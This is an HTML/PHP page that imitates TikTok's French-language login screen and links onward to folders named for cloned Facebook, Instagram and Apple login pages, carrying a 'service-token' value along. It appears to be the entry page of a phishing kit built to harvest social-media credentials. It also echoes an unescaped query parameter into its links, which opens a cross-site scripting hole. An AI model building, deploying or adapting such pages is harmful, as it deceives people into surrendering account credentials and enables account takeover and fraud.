<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css"
    />
    <link rel="shortcut icon" href="favicon.png" type="image/x-icon" />
    <title>TikTok</title>
    <style>
      * {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
      }

      header {
        color: black;
        padding: 10px 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
      }

      header i {
        font-size: 25px;
      }
      .choix img {
        width: 20px;
        height: 20px;
        margin-right: 10px;
      }
      main h2 {
        padding: 0px;
        text-align: center;
        font-size: 26px;
      }
      main .text {
        padding: 20px;
        text-align: center;
        color: #929292;
      }
      main section {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        gap: 12px;
      }
      main section a {
        display: flex;
        gap: 10px;
        font-weight: 500;
        align-items: center;
        border: 1px solid #d3d3d3;
        border-radius: 5px;
        padding: 11px;
        width: 300px;
        text-decoration: none;
        color: black;
      }
      footer{
        width: 100%;
        position: absolute;
        bottom: 0;
      }
      footer article {
        font-size: 12px;
        color: #929292;
        text-align: center;
        padding: 20px;
      }
      footer article span {
        color: black;
      }
      footer aside {
        padding: 20px;
        text-align: center;
        font-size: 15px;
        background: #f8f8f8;
        border-top: 1px solid #d3d3d3;
      }
    </style>
  </head>
  <body>
    <header>
      <i class="bi bi-x-lg"></i>
      <i class="bi bi-question-circle"></i>
    </header>
    <main>
      <h2>Connecte-toi à TikTok</h2>
      <p class="text">
        Gère ton compte, consulte tes notifications, commente des vidéos et bien
        plus encore.
      </p>
      <section>
        <a class="choix" href="#">
          <img src="tiktok_image.png" alt="TikTok" />
          <p>Utiliser l'application TikTok</p>
        </a>
        <a class="choix" href="./tiktok.php?service-token=<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>">
          <i
            class="bi bi-person-fill"
            style="color: black; font-size: 20px"
          ></i>
          <p style="font-size: 12px">
            Utiliser le téléphone/l'e-mail/le nom d'utilisateur
          </p>
        </a>
        <a class="choix" href="../old_facebook/?service-token=<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>">
          <img src="facebook_image.png" alt="Facebook" />
          <p>Continuer avec Facebook</p>
        </a>
        <a class="choix" href="../instagram/?service-token=<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>">
          <img src="instagram_image.png" alt="Instagram" />
          <p>Continuer avec Instagram</p>
        </a>
        <a class="choix" href="../icloud/?service-token=<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>">
          <i class="bi bi-apple" style="color: black; font-size: 20px"></i>
          <p>Continuer avec Apple</p>
        </a>
      </section>
    </main>
    <footer>
      <article>
        En continuant avec un compte basé dans votre pays, vous
        acceptez nos <span>Conditions d'utilisation</span> et reconnaissez avoir lu notre
        <span>Politique de confidentialité</span>.
      </article>
      <aside>
        Tu n'as pas de compte ? <b style="color: #f6345a;"> S'inscrire</b>
      </aside>
    </footer>
  </body>
</html>
